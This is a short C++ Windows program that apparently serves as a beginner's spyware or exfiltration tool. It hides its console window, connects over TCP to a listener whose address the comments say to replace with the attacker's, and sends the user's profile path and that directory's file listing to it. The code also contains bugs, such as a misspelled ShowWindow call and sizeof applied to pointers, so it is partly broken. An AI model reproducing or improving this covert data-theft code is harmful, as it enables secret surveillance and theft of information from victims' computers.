#define _WINSOCK_DEPRECATED_NO_WARNINGS
#pragma comment(lib, "Ws2_32.lib") // needed for the ws2_32.lib library

#include <iostream> // standard i/o utils
#include <winsock2.h> // networking utils
#include <stdio.h> // standard i/o utils

#include <stdlib.h> // Standar i/o utils
#include <dirent.h> // dir utils
#include <string> // string utils

char *userDirectory();

int main() {
	ShowWindo(GetConsoleWindow(), SW_HIDE); // do not show the main program window
	WSADATA WSAData;
	SOCKET server; // Variable used to store the connection of the SOCKET type
	SOCKADDR_IN addr; // variable holding connection details - of SOCKADDR_IN type

	WSAStartup(MAKEWORD(2, 0), &WSAData); // initialize usage of the winsock library
	server = socket(AF_INET, SOCK_STREAM, 0); // Set up a TCP socket
	addr.sin_addr.s_addr = inet_addr("127.0.0.1"); // Specify the target of network connection - replace the ip with your listening ip address
	addr.sin_family = AF_INET; // set address famlity (AF) to AF_INET - this address family contains IPv4 address to be used to communicate over TCP
	addr.sin_port = htons(8080); // remote port 
	connect(server, (SOCKADDR *) &addr, sizeof(addr)); // connect to the previously set up target host/port

	char *pPath = userDirectory();
	send(server, pPath, sizeof(pPath), 0);

	DIR *dir; // variable which points to type DIR
	struct dirent *ent; // new variable named ent: pointer to the structure
	if ((dir = opendir(pPath)) != NULL) {
		while ((ent = readdir(dir)) != NULL) {
			send(server, ent->d_name, sizeof(ent->d_name), 0);
		}
		closedir(dir);
	} else {
		puts("Error: Could not send directory details");
		exit(1);
	}

	closesocket(server); // close the socket
	WSACleanup(); // clean up the winsock library components

	return 0;
}

char *userDirectory() {
	char *pPath;
	pPath = getenv("USERPROFILE");
	if (pPath != NULL) {
		return pPath;
	} else {
		puts("userDirectory Error: Could not get path");
		exit(1);
	}
}
